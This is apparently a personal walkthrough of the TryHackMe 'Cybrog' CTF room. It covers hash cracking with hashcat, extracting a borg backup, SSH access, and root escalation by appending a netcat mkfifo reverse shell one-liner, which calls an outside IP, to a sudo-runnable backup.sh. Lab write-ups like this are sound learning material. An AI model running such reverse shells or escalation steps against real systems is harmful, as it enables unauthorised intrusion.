# Cybrog CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Cybrog** CTF challenge on [TryHackMe](https://tryhackme.com/room/cyborgt8). 
---

scanning and looking for hidden folders

![scan](imgs/scan.png "scan")

found `/admin`, `/etc/squid`

found paswd file in `/etc/squid`

![hash](imgs/hash.png "hash")

found conf file in /etc/squid

![conf](imgs/conf.png "conf")

cracked the hash with hashcat

```
hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
![hashcat](imgs/hashcat.png "hashcat")

downloaded archive from website 

its using borg

![borgbackupinfo](imgs/borgbackupinfo.png "borgbackupinfo")

![borgconfig](imgs/borgconfig.png "borgconfig")

we need passphrase for the archive, the previous one does the work

![borglist](imgs/borglist.png "borglist")


```
borg extract home/field/dev/final_archive/::music_archive
```

after extracting:

![borgusers](imgs/borgusers.png "borgusers")


extracted borg backup and found `note.txt` in `/home/alex/Documents`

![note](imgs/note.png "note")

now we probably have ssh credentials

we got user flag

![user](imgs/user.png "user")

found interesting things with sudo -l

![sudol](imgs/sudol.png "sudol")

content of the backup.sh file:

![backup](imgs/backup.png "backup")

i added write permission to our file `chmod +w`

then put reverse shell into our script

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.91.59 4445 >/tmp/f" >> backup.sh
```

![rev](imgs/rev.png "rev")

and we got root access and root flag

![root](imgs/root.png "root")

## MACHINE PWNED
